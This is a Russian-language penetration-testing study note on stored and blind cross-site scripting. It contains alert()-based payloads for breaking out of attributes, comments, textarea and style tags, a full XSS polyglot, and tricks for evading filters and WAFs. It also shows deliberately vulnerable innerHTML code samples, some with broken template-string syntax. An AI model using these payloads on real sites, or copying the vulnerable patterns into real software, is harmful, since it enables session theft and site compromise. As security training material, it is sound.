[Хранимые XSS-атаки](https://portswigger.net/web-security/cross-site-scripting/stored) являются наиболее распространенным типом. С точки зрения разработчика хранимый XSS очень прост для понимания. Клиент отправляет вредоносный код на сервер, обычно через HTTP. Сервер обновляет базу данных, и доступ к этому коду появляется у других пользователей, в результате чего он будет выполнен в их браузерах.

Объект, сохраненный в базе данных, могут просматривать многие. При заражении глобального объекта мишенью XSS-атаки могут стать все пользователи.

#### Пример обнаружения:
Предположим, есть портал где можно написать отзыв и получить ответ от службы поддержки. И мы хотим подчеркнуть важность своего текста, но данной функции не предусмотрено и мы использует HTML-тег: `<strong> Внимание. </strong>` 
И после нажатия клавиши Enter мы увидим свой запрос, в котором текст, находящийся внутри тегов <strong></strong>, будет выделен жирным шрифтом.

1. пользователь отправляет комментарий через веб-форму ->
2. комментарий пользователя сохраняется в базу данных ->
3. комментарий запрашивается через HTTP другим пользователем ->
4. комментарий внедряется в страницу ->
5. внедренный комментарий интерпретируется не как текст, а как DOM

Обычно так бывает, когда разработчик применяет результат HTTP-запроса к DOM. Часто это делается с помощью следующего сценария:
```
/*
* Создается узел DOM типа 'div.
* Добавленная к нему строка интерпретируется как фрагмент DOM.
*/
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment; // Здесь происходит интерпретация HTML

/*
* Добавляем div к DOM с innerHTML DOM из комментария (comment).
* Теперь при загрузке комментарий анализируется и преобразуется
* как элемент DOM.
*/
const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);
```


В этом коде строка `div.innerHTML = comment;` интерпретирует строку comment как HTML. Если злоумышленник оставит комментарий с JavaScript-кодом, например:
```
<script>alert('XSS Attack!');</script>
```
то при выполнении div.innerHTML = comment; этот код будет выполнен в контексте страницы, что приведет к XSS-атаке.


#### Пример с фильтрацией
Теперь представим, что мы добавили простую фильтрацию для закрывающих тегов:
```
function sanitizeInput(comment) {
    return comment.replace(/</?[^>]+(>|$)/g, ""); // Удаляем HTML-теги
}

function addComment(comment) {
    const sanitizedComment = sanitizeInput(comment);
    const div = document.getElementById('comments');
    div.innerHTML += sanitizedComment; // Теперь безопасно
}

```

В этом случае, если пользователь введет тот же комментарий с `<script>`, он будет удален, и на странице ничего не произойдет.

#### Обход фильтрации

Тем не менее, мы можем использовать другие способы для выполнения JavaScript-кода. Например, можем ввести следующий код:
`<img src="invalid.jpg" onerror="alert('XSS Attack!')">`

При добавлении этого комментария на страницу обработчик события `onerror` сработает, когда браузер не сможет загрузить изображение по указанному адресу. Это приведет к выполнению JavaScript-кода.

Тег `<img>` отвечает за загрузку картинки на страницу, и при указании адреса, откуда ее загружать, добавляется обработчик событий, который активируется в случае успеха или ошибки при загрузке. В данном случае при ошибке загрузки картинки с ресурса **example.com** сработает обработчик событий `onerror`, который запустит скрипт `alert('XSS')`. Вариаций использования обработчиков событий также довольно много: `onload`, `onerror`, `onmouseover` и т.д.


## XSS (**blind XSS**)

«слепые» XSS (**blind XSS**) — это вариант хранимой XSS. Суть их работы заключается в том, что мы не можем сразу увидеть результат, или результат работы [[Pentest/Термины#Полезная нагрузка (Payload)|пейлоада]] будет выводиться, например, на какой-то другой странице, вроде формы обратной связи или публикации отзывов с предварительной модерацией сообщений. Payolad можно отследить через [[Встроенный инструмент браузера#Специфические форматы данных|поле Payload]]

Главная проблема поиска blind XSS в том, что необходимо учитывать множество контекстов, в которых может выполняться код, например, внутри одинарных или двойных кавычек, различных атрибутов и т.д. Для примера возьмем один и тот же пейлоад и посмотрим, в каких контекстах он может находиться. Исходный пейлоад опять же будет простым `<script>alert(context)</script>`.

#### Выход за пределы атрибута в одинарных кавычках

Пейлоад:
`'><script>alert('XSS Attack!');</script>`


Пример уязвимого JavaScript-кода:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Example</title>
</head>
<body>
    <input type="text" id="userInput" value="">
    <button onclick="setInputValue()">Отправить</button>
    
    <script>
        function setInputValue() {
            const userInput = document.getElementById('userInput').value;
            document.body.innerHTML += <div class='user-comment' value='${userInput}'></div>; // Уязвимый код
        }
    </script>
</body>
</html>
```


#### Выход за пределы атрибута в одинарных и двойных кавычках

Пейлоад:
`'"><script>alert('XSS Attack!');</script>`


Пример уязвимого JavaScript-кода:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Example</title>
</head>
<body>
    <input type="text" id="userInput" value="">
    <button onclick="setInputValue()">Отправить</button>
    
    <script>
        function setInputValue() {
            const userInput = document.getElementById('userInput').value;
            document.body.innerHTML += <div class="user-comment" style="background-image:url('${userInput}')"></div>; // Уязвимый код
        }
    </script>
</body>
</html>
```


#### Выход за пределы HTML-комментария

Пейлоад:
`-->'"><script>alert('XSS Attack!');</script>`


Пример уязвимого JavaScript-кода:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Example</title>
</head>
<body>
    <textarea id="commentInput"></textarea>
    <button onclick="addComment()">Добавить комментарий</button>

    <script>
        function addComment() {
            const comment = document.getElementById('commentInput').value;
            document.body.innerHTML += <!-- ${comment} -->; // Уязвимый код
        }
    </script>
</body>
</html>
```


#### Выход за пределы элемента `<textarea>`

Пейлоад:
`</textarea>'><script>alert('XSS Attack!');</script>`


Пример уязвимого JavaScript-кода:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Example</title>
</head>
<body>
    <textarea id="commentInput"></textarea>
    <button onclick="addComment()">Добавить комментарий</button>

    <script>
        function addComment() {
            const comment = document.getElementById('commentInput').value;
            document.body.innerHTML += <textarea>${comment}</textarea>; // Уязвимый код
        }
    </script>
</body>
</html>
```


#### Выход за пределы элемента `<style>`

Пейлоад:
`</style></textarea>'><script>alert('XSS Attack!');</script>`


Пример уязвимого JavaScript-кода:
`<!DOCTYPE html>`
`<html lang="en">`
`<head>`
    `<meta charset="UTF-8">`
    `<title>XSS Example</title>`
    `<style id="dynamicStyle"></style> <!-- динамический стиль -->`
`</head>`
`<body>`
    `<input type="text" id="styleInput" value="">`
    `<button onclick="addStyle()">Добавить стиль</button>`

    `<script>`
        `function addStyle() {`
            `const styleContent = document.getElementById('styleInput').value;`
            `document.getElementById('dynamicStyle').innerHTML += styleContent; // Уязвимый код`
        `}`
    `</script>`
`</body>`
`</html>`


## XSS-полиглоты
Проверить эти параметры может помочь использование **XSS-полиглотов** это специальные пейлоады, которые могут выполняться в различных контекстах HTML и JavaScript. Они предназначены для обхода фильтров и защиты, которые могут быть установлены на веб-приложении.
```
javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>">[img=1]<img -/style=-=expression&#40&#47;&#42;’/-/*&#39;,/**/eval(name)//&#41;;width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>
```
Существуют множество пейлоадов-полиглотов, которые можно найти в репозиториях, таких как SecLists или [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/XSSPolyglot.txt)

## От сигнатурного анализа XSS

вместо `<script>alert('XSS')</script>` использовать конструкцию `\<a onmouseover="alert('XSS')">xss link\</a>` для создания ссылки, при наведении на которую сработает обработчик событий `onmouseover`, выполнив скрипт. Если фильтруется ввод закрывающих тегов, то можно перейти на теги, которые не требуется закрывать, например **<img>**. Если WAF блокирует и закрывающие теги, и теги типа **<img>**, то можно попробовать тег `body`: `<BODY ONLOAD=alert('XSS')>`

Еще один вариант обхода блокировки WAF – методы обфускации пейлоада. Например, используя URL-Encode стандартный пейлоад `<script>alert(XSS)</script>`, можно превратить в `%3Cscript%3Ealert%28XSS%29%3C%2Fscript%3E`.


# Как найти и протестировать сохраненные уязвимости XSS

Точки входа в обработку заявки включают в себя:

- Параметры или другие данные в строке запроса URL и теле сообщения.
- Путь к файлу URL.
- Заголовки HTTP-запросов, которые могут не поддаваться эксплуатации в отношении отраженного XSS.
- Любые внеполосные маршруты, по которым злоумышленник может доставить данные в приложение. Существующие маршруты полностью зависят от функциональности, реализованной приложением: приложение веб-почты будет обрабатывать данные, полученные в электронных письмах; приложение, отображающее ленту Twitter, может обрабатывать данные, содержащиеся в сторонних твитах; а агрегатор новостей будет включать данные, происходящие с других веб-сайтов.

Точками выхода для сохраненных XSS-атак являются все возможные HTTP-ответы, которые возвращаются любому пользователю приложения в любой ситуации.

- Данные, отправленные в любую точку входа, в принципе могут быть выданы из любой точки выхода. Например, отображаемые имена, предоставленные пользователем, могут появляться в скрытом журнале аудита, который виден только некоторым пользователям приложения.
- Данные, которые в настоящее время хранятся в приложении, часто уязвимы для перезаписи из-за других действий, выполняемых в приложении. Например, функция поиска может отображать список последних поисков, которые быстро заменяются, когда пользователи выполняют другие поиски.

